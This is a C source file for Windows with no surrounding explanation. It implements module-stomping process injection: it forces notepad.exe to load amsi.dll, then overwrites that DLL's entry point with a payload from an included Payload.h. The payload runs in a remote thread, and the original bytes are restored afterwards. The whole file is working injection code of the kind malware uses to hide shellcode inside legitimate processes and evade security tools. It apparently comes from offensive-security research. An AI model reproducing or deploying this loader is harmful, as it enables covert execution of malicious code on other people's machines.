#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "Payload.h"


DWORD FindPID( LPCSTR procName ) {

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "Failed to create snapshot. Error: %lu\n", GetLastError() );
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof( PROCESSENTRY32 );

    DWORD pid = 0;

    if ( Process32First( hSnapshot, &pe ) ) {
        do {
            if ( strcmp( pe.szExeFile, procName ) == 0 ) {
                pid = pe.th32ProcessID;
                break;
            }
        } while ( Process32Next( hSnapshot, &pe ) );
    }

    CloseHandle( hSnapshot );
    return pid;
}


VOID GetEntryPoint( HANDLE hProcess, HMODULE hModule, PDWORD AddressOfEntryPoint ) {

    IMAGE_DOS_HEADER dosHeader;
    if ( !ReadProcessMemory( hProcess, hModule, &dosHeader, sizeof( IMAGE_DOS_HEADER ), NULL ) ) {
        fprintf( stderr, "Failed to read DOS header. Error: %lu\n", GetLastError() );
        return;
    }
    if ( dosHeader.e_magic != IMAGE_DOS_SIGNATURE ) {
        fprintf( stderr, "Invalid DOS signature.\n" );
        return;
    }

    IMAGE_NT_HEADERS ntHeaders;
    if ( !ReadProcessMemory( hProcess, ( BYTE* )hModule + dosHeader.e_lfanew, &ntHeaders, sizeof( IMAGE_NT_HEADERS ), NULL ) ) {
        fprintf( stderr, "Failed to read NT headers. Error: %lu\n", GetLastError() );
        return;
    }

    if ( ntHeaders.Signature != IMAGE_NT_SIGNATURE ) {
        fprintf( stderr, "Invalid NT signature.\n" );
        return;
    }

    printf( "Address of Entry Point: 0x%p\n", ( BYTE* )hModule + ntHeaders.OptionalHeader.AddressOfEntryPoint );
    *AddressOfEntryPoint = ntHeaders.OptionalHeader.AddressOfEntryPoint;
}

int main() {

    LPCSTR procName = "notepad.exe";
    DWORD pid = FindPID( procName );

    if ( !pid ) {
        printf( "Process %s not found.\n", procName );
        return 1;
    }

    printf( "Found process %s with PID: %lu\n", procName, pid );

    HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid );

    if ( !hProcess ) {
        printf( "Failed to open process. Error: %lu\n", GetLastError() );
        return 1;
    }

    // for ( unsigned int i = 0; i < ( cbNeeded / sizeof( HMODULE ) ); i++ ) {
    //     char szModName[ MAX_PATH ];
    //     if ( GetModuleFileNameExA( hProcess, hMods[ i ], szModName, sizeof( szModName ) / sizeof( char ) ) ) {
    //         printf( "Module: %s\n", szModName );
    //     }
    //     MODULEINFO modInfo;
    //     if ( GetModuleInformation( hProcess, hMods[ i ], &modInfo, sizeof( MODULEINFO ) ) ) {
    //         printf( "Base Address: %p\n", modInfo.lpBaseOfDll );
    //         printf( "Size: %lu bytes\n", modInfo.SizeOfImage );
    //     }
    // }

    // HMODULE hMod = LoadLibraryA( "MSCTF.dll" );
    // if ( !hMod ) {
    //     printf( "Failed to get handle for MSCTF.dll. Error: %lu\n", GetLastError() );
    //     CloseHandle( hProcess );
    //     return 1;
    // }
    // printf( "MSCTF.dll Base Address: %p\n", hMod );

    // HMODULE h

    HMODULE hKernel32 = GetModuleHandleA( "kernel32.dll" );
    if ( !hKernel32 ) {
        printf( "Failed to get handle for kernel32.dll. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    FARPROC pLoadLibraryA = GetProcAddress( hKernel32, "LoadLibraryA" );
    if ( !pLoadLibraryA ) {
        printf( "Failed to get address of LoadLibraryA. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    CHAR modName[] = "C:\\Windows\\System32\\amsi.dll";

    PVOID remoteBuffer = VirtualAllocEx( hProcess, NULL, sizeof( modName ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( remoteBuffer == NULL ) {
        printf( "Failed to allocate memory in target process. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    if ( !WriteProcessMemory( hProcess, remoteBuffer, modName, sizeof( modName ), NULL ) ) {
        printf( "Failed to write module name to target process. Error: %lu\n", GetLastError() );
        VirtualFreeEx( hProcess, remoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    DWORD oldProtect;
    if ( !VirtualProtectEx( hProcess, remoteBuffer, sizeof( modName ), PAGE_EXECUTE_READ, &oldProtect ) ) {
        printf( "Failed to change memory protection in target process. Error: %lu\n", GetLastError() );
        VirtualFreeEx( hProcess, remoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )pLoadLibraryA, remoteBuffer, 0, NULL );
    if ( !hThread ) {
        printf( "Failed to create remote thread. Error: %lu\n", GetLastError() );
        VirtualFreeEx( hProcess, remoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    WaitForSingleObject( hThread, 1000 );

    HMODULE hMods[ 1024 ];
    DWORD cbNeeded;
    if ( !EnumProcessModules( hProcess, hMods, sizeof( hMods ), &cbNeeded ) ) {
        printf( "Failed to enumerate modules. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    HMODULE hTargetMod = NULL;

    for ( unsigned int i = 0; i < ( cbNeeded / sizeof( HMODULE ) ); i++ ) {
        char szModName[ MAX_PATH ];
        if ( GetModuleFileNameExA( hProcess, hMods[ i ], szModName, sizeof( szModName ) / sizeof( char ) ) ) {
            char* baseName = strrchr( szModName, '\\' );
            // printf( "Module: %s\n", baseName ? baseName + 1 : szModName );
            // printf( "Module: %s\n", szModName );
            if ( _stricmp( baseName ? baseName + 1 : szModName, "amsi.dll" ) == 0 ) {
                MODULEINFO modInfo;
                printf( "Module: %s\n", baseName ? baseName + 1 : szModName );
                if ( GetModuleInformation( hProcess, hMods[ i ], &modInfo, sizeof( MODULEINFO ) ) ) {
                    hTargetMod = hMods[ i ];
                    printf( "Base Address: %p\n", modInfo.lpBaseOfDll );
                    printf( "Size: %lu bytes\n", modInfo.SizeOfImage );
                }
            }
        }
    }

    if ( hTargetMod == NULL ) {
        printf( "Failed to find amsi.dll in target process.\n" );
        CloseHandle( hProcess );
        return 1;
    }

    DWORD AddressOfEntryPoint;
    GetEntryPoint( hProcess, hTargetMod, &AddressOfEntryPoint );

    LPVOID entryPointAddr = ( BYTE* )hTargetMod + AddressOfEntryPoint;
    printf( "Entry Point Address: %p\n", entryPointAddr );

    getchar();

    DWORD oldProtect2;
    if ( !VirtualProtectEx( hProcess, entryPointAddr, payloadSize, PAGE_READWRITE, &oldProtect2 ) ) {
        printf( "Failed to change memory protection. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
    }

    BYTE* buffer = ( BYTE* )malloc( payloadSize );
    if ( !buffer ) {
        printf( "Failed to allocate local buffer.\n" );
        CloseHandle( hProcess );
    }

    if ( !ReadProcessMemory( hProcess, entryPointAddr, buffer, payloadSize, NULL ) ) {
        printf( "Failed to read original bytes from target process. Error: %lu\n", GetLastError() );
        free( buffer );
        CloseHandle( hProcess );
    }

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( hProcess, entryPointAddr, payload, payloadSize, &bytesWritten ) ) {
        printf( "Failed to write payload to target process. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
    }

    printf( "[+] Check bytes at %p\n", entryPointAddr );
    getchar();

    if ( !VirtualProtectEx( hProcess, entryPointAddr, payloadSize, oldProtect2, &oldProtect2 ) ) {
        printf( "Failed to restore memory protection. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
    }

    HANDLE hThread2 = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )entryPointAddr, NULL, 0, NULL );
    if ( !hThread2 ) {
        printf( "Failed to create remote thread. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
    }

    WaitForSingleObject( hThread2, INFINITE );

    printf( "[+] Reverting original bytes...\n" );
    if ( !VirtualProtectEx( hProcess, entryPointAddr, payloadSize, PAGE_READWRITE, &oldProtect2 ) ) {
        printf( "Failed to change memory protection. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
    }

    if ( !WriteProcessMemory( hProcess, entryPointAddr, buffer, payloadSize, &bytesWritten ) ) {
        printf( "Failed to write original bytes back to target process. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
    }

    if ( !VirtualProtectEx( hProcess, entryPointAddr, payloadSize, oldProtect2, &oldProtect2 ) ) {
        printf( "Failed to restore memory protection. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
    }

    printf( "[+] Original bytes restored.\n" );
    getchar();

    CloseHandle( hThread );
    CloseHandle( hThread2 );
    CloseHandle( hProcess );

    return 0;
}